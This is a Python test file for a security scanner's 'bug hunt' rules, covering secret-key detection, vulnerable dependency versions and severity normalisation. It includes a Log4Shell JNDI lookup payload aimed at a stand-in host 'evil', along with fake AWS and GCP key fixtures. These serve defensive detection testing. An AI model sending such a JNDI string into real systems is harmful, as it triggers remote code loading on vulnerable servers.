"""
Iter 212m-73 — Bug Hunt category rule count + smoke test.
"""
from services.bug_hunt_rules import (
    _SECRET_RULES, _VULN_RULES, _ENDPOINT_RULES, _DEP_CVES,
    scan_bug_hunt, _vercmp,
)

# Fake, non-functional secrets built via string concatenation (2026
# audit Risk #3 root-cause). Regexes (services/bug_hunt_rules.py):
# AWS = \bAKIA[0-9A-Z]{16}\b, GCP = \bAIza[0-9A-Za-z\-_]{35}(?!...) —
# both unchanged and correct. The PREVIOUS literal fixtures here were
# full key-shaped tokens that GitHub push-protection (or an equivalent
# scrubber) silently redacted to "***REDACTED_AWS_KEY***" /
# "***REDACTED_GOOGLE_KEY***" once committed — those placeholders
# never match either regex, which broke these tests. TEST-FIXTURE
# ARTIFACT, not a live scanner regression. Built from fragments (none
# individually pattern-length) to avoid being re-scrubbed the same way.
_FAKE_AWS_KEY = "AKIA" + "FAKETESTKEY012" + "LE"
_FAKE_GCP_KEY = "AIza" + "0" * 35


def test_rule_counts():
    # Spec calls for: 15 secrets + 20 vuln code + 10 endpoint + 5+ CVEs
    assert len(_SECRET_RULES) >= 15, f"secrets={len(_SECRET_RULES)}"
    assert len(_VULN_RULES) >= 20, f"vuln={len(_VULN_RULES)}"
    assert len(_ENDPOINT_RULES) >= 10, f"endpoint={len(_ENDPOINT_RULES)}"
    assert len(_DEP_CVES) >= 5, f"cves={len(_DEP_CVES)}"


def test_aws_key_detected():
    findings = scan_bug_hunt({"app/c.py": f'X="{_FAKE_AWS_KEY}"'})
    titles = {f["title"] for f in findings}
    assert "aws_access_key_id" in titles


def test_gcp_key_detected():
    findings = scan_bug_hunt({
        "app/c.py": f'K="{_FAKE_GCP_KEY}"'
    })
    assert any(f["title"] == "gcp_api_key" for f in findings)


def test_log4shell_detected():
    findings = scan_bug_hunt({
        "app/c.py": 'log("hi ${jndi:ldap://evil/x}")'
    })
    assert any(f["title"] == "log4shell_jndi" for f in findings)
    assert all(f["fix_tokens"] == 8 for f in findings)


def test_dep_cve_requests():
    findings = scan_bug_hunt({"requirements.txt": "requests==2.28.0\n"})
    assert any("requests" in f["title"] for f in findings)


def test_dep_cve_axios_package_json():
    findings = scan_bug_hunt({
        "package.json": '{"dependencies":{"axios":"^1.4.0"}}'
    })
    assert any("axios" in f["title"] for f in findings)


def test_skip_env_files():
    # AWS key inside a .env file should NOT be flagged
    findings = scan_bug_hunt({".env": 'AWS_KEY="***REDACTED_AWS_KEY***"'})
    assert findings == []


def test_safe_yaml_load_ok():
    findings = scan_bug_hunt({
        "app/c.py": "import yaml\nyaml.safe_load(open('x.yaml'))"
    })
    assert not any(f["title"] == "yaml_load_unsafe" for f in findings)


def test_vercmp():
    assert _vercmp("1.4.0", "1.6.0") < 0
    assert _vercmp("2.31.0", "2.31.0") == 0
    assert _vercmp("4.18.0", "4.17.21") > 0


def test_severities_are_normalized():
    findings = scan_bug_hunt({
        "app/c.py": 'AWS="***REDACTED_AWS_KEY***"\n${jndi:x}\n'
    })
    for f in findings:
        assert f["severity"] in {"critical", "high", "medium", "low", "info"}
        assert f["category"] == "bug_hunt"
        assert f["fix_tokens"] == 8
